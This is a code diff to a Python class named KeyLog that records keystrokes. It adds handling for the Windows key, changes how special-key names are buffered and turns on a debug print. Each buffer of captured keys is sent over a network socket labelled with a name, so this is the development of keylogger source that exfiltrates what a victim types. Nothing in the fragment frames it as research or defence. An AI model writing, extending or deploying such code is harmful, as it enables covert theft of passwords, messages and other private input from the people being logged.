@@ -34,7 +34,8 @@ class KeyLog:
             Key.enter: 'Enter',
             Key.space: 'Space',
             Key.esc: 'Escape',  # Example for Escape key
-            Key.backspace: 'Backspace',  # Example for Backspace key
+            Key.backspace: 'Backspace',
+            Key.cmd: 'Win'
         }
 
         if isinstance(key, Key):
@@ -48,7 +49,15 @@ class KeyLog:
                 text = self.format_key(key)
 
                 if len(text) > 1:
-                    self.buffer_key +=  text + " "
+                    if self.buffer_key:
+                        last_word = self.buffer_key.split()[-1]
+                        if last_word == 'Win':
+                            if text != 'Win':
+                                self.buffer_key += text + " "
+                        else:
+                            self.buffer_key += text + " "
+                    else:
+                      self.buffer_key +=  text + " "
                 else:
                     self.buffer += text
                 if self.timer:
@@ -84,7 +93,7 @@ class KeyLog:
 
     def send_buffer_key(self):
         message = f"{self.name}{self.SEPERATOR}{self.buffer_key}"
-        # print(f'send {message}')
+        print(f'send {message}')
         self.buffer_key = ""
         self.s.send(message.encode())
 
